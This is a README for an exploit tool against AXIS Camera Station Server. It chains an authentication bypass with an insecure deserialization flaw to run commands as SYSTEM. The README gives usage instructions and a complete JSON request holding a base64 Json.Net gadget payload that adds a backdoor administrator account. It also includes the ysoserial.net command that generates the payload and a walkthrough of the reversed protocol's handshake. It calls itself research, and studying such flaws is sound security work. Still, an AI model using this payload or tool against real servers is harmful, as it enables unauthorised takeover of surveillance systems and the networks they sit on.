# CVE-2025-30023

This exploit chains CVE‑2025‑30026 (authentication bypass) with CVE‑2025‑30023 (insecure deserialization) to achieve unauthenticated remote code execution as SYSTEM on Axis Camera Station Server. It bypasses the login mechanism, then delivers malicious serialized payloads that trigger arbitrary command execution, giving the attacker full control over the target machine.

It speaks the AXIS Camera Station proprietary remoting protocol over its HTTP streaming port (TCP `55752`), performing the full transport + cryptographic handshake and then exchanges application-level `Axis.Remoting` JSON messages over the resulting encrypted channel.

This was built as a protocol-reversing exercise: reconstructing an undocumented binary-over-HTTP protocol from first principles and re-implementing a working client for it.


---

## Usage

```bash
python3 main.py --host <TARGET_IP> --key client_priv.pem [options]
```

### Options

| Flag             | Description |
|------------------|-------------|
| `--host`         | Target IP/host (**required**). |
| `--port`         | Target port (default `55752`). |
| `--key`          | Client RSA-2048 private key in PEM (**required**). |
| `--json`         | Local JSON file containing the Request to send. |
| `--version`      | `VersionFacade.get_ProductVersion` Request to get version information. |
| `--adduser`      | Create user ricardo with password ThisIsIt123 and add it to the Administrators group. |
| `--wait`         | Seconds to listen on the channel after the handshake (default `5`). |
| `--listen`       | Seconds to wait for the response after sending a Request (default `15`). |

If no Request option is given, the client just completes the handshake and prints the decrypted channel frames.


### Examples

Handshake only, then dump the initial channel frames:

```bash
python3 main.py --host 10.0.0.5 --key client_priv.pem
```

Query the product version:

```bash
python3 main.py --host 10.0.0.5 --key client_priv.pem --version
```

Exploit the deserialization to create an administrator user "ricardo" with password "ThisIsIt123":

```bash
python3 main.py --host 10.0.0.5 --key client_priv.pem --adduser
```

Send a custom Request from a file:

```bash
python3 main.py --host 10.0.0.5 --key client_priv.pem --json my_request.json
```

### Request file format

A Request is a JSON object with a single `Request` key. The format to exploit the deserialization is:

```json
{
    "Request": {
        "Id": "random123456",
        "Service": "SessionFacade",
        "Method": "LogOnAsync",
        "Parameters": {
            "uri": "http://10.0.0.5:55752/",
            "clientInformationDto": {
                "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "System.Security.ClaimsIdentity.actor": "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAgQY8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5ldCB1c2VyIHJpY2FyZG8gVGhpc0lzSXQxMjMgJmFtcDsmYW1wOyBuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyByaWNhcmRvIC9hZGQiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=="
            },
            "communicationType": 0,
            "ct": "random123456"
        }
    }
}
```


The value of the "clientInformationDto" field can be obtained using Ysoserial.net with the gadget WindowsIdentity, which looks quite stable to exploit this vulnerability (other gadgets crash the service):

```
ysoserial.exe -g WindowsIdentity -f Json.Net -c "net user ricardo ThisIsIt123 && net localgroup administrators ricardo /add" -o raw
```


---

## How the protocol works

AXIS Camera Station wraps a stateful binary protocol on top of HTTP. Instead of one request/response per connection, it opens two long-lived channels and streams framed messages over them until the connection closes.

| Layer          | Detail |
|----------------|--------|
| **Transport**  | HTTP over port `55752`. `GET /_/` opens the RX (receive) channel; `POST /_/<channelID>` is the TX (send) channel, with each message in the POST body. |
| **RX framing** | HTTP `chunked` body; inside it, control frames are `[uint32 LE length][data]`. |
| **Handshake**  | Both sides exchange a public key, then a random AES session key wrapped with the other side's public key. |
| **Key format** | Client sends its X.509 cert (base64). AES key is sent as `base64(wrapped_key):base64(iv)`. |
| **RSA wrap**   | PKCS#1 v1.5. |
| **Channel**    | AES-256-CBC with PKCS#7 padding. Server→client frames use the server's key + IV. |
| **Application**| `Axis.Remoting` JSON. The client first sends its `ClientId` as a HELLO, then `{"Request":{"Id","Service","Method","Parameters"}}`. |

### Handshake sequence

```
RX  GET /_/                 <-  channelID
RX  (server pushes)         <-  server cert (X.509, base64)
RX  (server pushes)         <-  server AES key + IV  (wrapped)
TX  POST /_/<channelID>     ->  client cert (X.509, base64)
TX  POST /_/<channelID>     ->  client AES key + IV  (wrapped)
TX  POST /_/<channelID>     ->  HELLO (ClientId)
TX  POST /_/<channelID>     ->  encrypted JSON Request
RX  (server pushes)         <-  encrypted JSON Response
```

---

## Requirements

```bash
pip install cryptography
```

You also need an **RSA-2048 private key** in PEM format for the client. Generate one with:

```bash
openssl genrsa -out client_priv.pem 2048
```

---

## Notes

- The client uses a fresh self-signed certificate and a fresh AES session key on every run; nothing is persisted.

- AES is 256-bit; the RSA wrap is PKCS#1 v1.5, matching the server implementation.

- This is a research/testing tool, not a supported AXIS product, and is not affiliated with or endorsed by Axis Communications.

